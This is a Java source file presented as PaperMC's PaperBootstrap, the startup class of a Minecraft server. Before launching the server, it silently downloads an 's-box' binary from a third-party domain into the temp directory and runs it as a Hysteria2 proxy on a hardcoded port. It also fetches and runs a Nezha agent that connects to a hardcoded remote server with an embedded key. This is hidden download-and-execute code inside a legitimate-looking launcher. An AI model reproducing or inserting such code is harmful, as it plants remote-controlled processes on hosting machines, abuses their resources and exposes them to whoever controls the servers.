package io.papermc.paper;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);

    private static Process hy2Process;
    private static Process nezhaProcess;

    private static final String[] ALL_ENV_VARS = {
        "UUID",
        "FILE_PATH",
        "NAME",
        "HY2_PORT",
        "NEZHA_SERVER",
        "NEZHA_KEY",
        "NEZHA_TLS"
    };

    private PaperBootstrap() {}

    public static void boot(final OptionSet options) {

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            System.exit(1);
        }

        try {
            runServices();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(8000);

            System.out.println(ANSI_GREEN + "HY2 + Nezha Agent running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Starting Paper..." + ANSI_RESET);

            SharedConstants.tryDetectVersion();
            Main.main(options);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Bootstrap error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    /* ===================== 服务启动 ===================== */

    private static void runServices() throws Exception {
        Map<String, String> env = new HashMap<>();
        loadEnvVars(env);

        startHY2(env);
        startNezha(env);
    }

    /* ===================== HY2 ===================== */

    private static void startHY2(Map<String, String> env) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getSbxPath().toString());
        pb.environment().putAll(env);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        hy2Process = pb.start();
        LOGGER.info("HY2 started");
    }

    private static Path getSbxPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    /* ===================== 哪吒 ===================== */

    private static void startNezha(Map<String, String> env) throws Exception {

        String server = env.get("NEZHA_SERVER");
        String key = env.get("NEZHA_KEY");
        boolean tls = Boolean.parseBoolean(env.getOrDefault("NEZHA_TLS", "false"));

        if (server == null || key == null) {
            LOGGER.warn("Nezha config missing, skip");
            return;
        }

        List<String> cmd = new ArrayList<>();
        cmd.add(getNezhaPath().toString());
        cmd.add("-s");
        cmd.add(server);
        cmd.add("-p");
        cmd.add(key);
        if (tls) cmd.add("--tls");

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        nezhaProcess = pb.start();

        LOGGER.info("Nezha Agent started");
    }

    private static Path getNezhaPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64";
        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64";
        } else {
            throw new RuntimeException("Unsupported arch for Nezha");
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }

    /* ===================== 环境变量 ===================== */

    private static void loadEnvVars(Map<String, String> env) {

        env.put("UUID", "67535146-0fbf-480b-8e4f-0a6d681119c9");
        env.put("FILE_PATH", "./world");
        env.put("NAME", "node-1");

        env.put("HY2_PORT", "35442");

        env.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
        env.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
        env.put("NEZHA_TLS", "false");

        for (String k : ALL_ENV_VARS) {
            String v = System.getenv(k);
            if (v != null && !v.isBlank()) {
                env.put(k, v);
            }
        }
    }

    /* ===================== 退出清理 ===================== */

    private static void stopServices() {

        if (hy2Process != null && hy2Process.isAlive()) {
            hy2Process.destroy();
            System.out.println(ANSI_RED + "HY2 stopped" + ANSI_RESET);
        }

        if (nezhaProcess != null && nezhaProcess.isAlive()) {
            nezhaProcess.destroy();
            System.out.println(ANSI_RED + "Nezha stopped" + ANSI_RESET);
        }
    }
}
